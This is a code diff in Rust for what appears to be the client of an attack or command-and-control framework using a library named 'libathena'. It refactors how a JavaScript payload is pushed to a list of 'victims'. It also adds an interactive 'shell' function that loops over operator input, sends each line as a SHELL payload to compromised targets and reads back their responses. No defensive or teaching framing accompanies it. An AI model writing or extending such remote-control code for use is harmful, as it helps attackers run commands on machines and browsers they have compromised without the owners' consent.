@@ -18,13 +18,13 @@ use std::env::var;
 use std::io::Write;
 use std::process::Command;
 
-use libathena::payload::attack::{PayloadBuilder, PayloadID};
+use libathena::payload::attack::PayloadBuilder;
 use tempfile::tempdir;
 use tokio::fs;
 
 use crate::{errors::*, State};
 
-pub async fn javascript<W: Write>(s: &mut State<W>) -> CliResult<Vec<PayloadID>> {
+pub async fn javascript<W: Write>(s: &mut State<W>) -> CliResult<()> {
     const FILE_NAME: &str = "payload.js";
 
     let editor = if s.editor.is_some() {
@@ -59,12 +59,26 @@ pub async fn javascript<W: Write>(s: &mut State<W>) -> CliResult<Vec<PayloadID>>
         .build()
         .unwrap();
 
-    let mut payload_ids = Vec::with_capacity(s.victims.len());
-    for victim in s.victims.iter() {
-        payload.victim = victim.name.to_owned();
-        let id = s.client.attack_set_payload(&payload).await?;
-        payload_ids.push(id);
+    s.upload_payload(&mut payload).await?;
+    Ok(())
+}
+
+pub async fn shell<W: Write>(s: &mut State<W>, input: &mut String) -> CliResult<()> {
+    let mut payload = PayloadBuilder::default()
+        .victim("".into())
+        .payload_type("SHELL".into())
+        .payload("".into())
+        .password(s.client.get_password().to_owned())
+        .build()
+        .unwrap();
+
+    loop {
+        s.mode.clone().print_and_read(s, input)?;
+
+        payload.payload = input.trim().to_string();
+        s.upload_payload(&mut payload).await?;
+        s.read_responses().await?;
     }
 
-    Ok(payload_ids)
+    Ok(())
 }
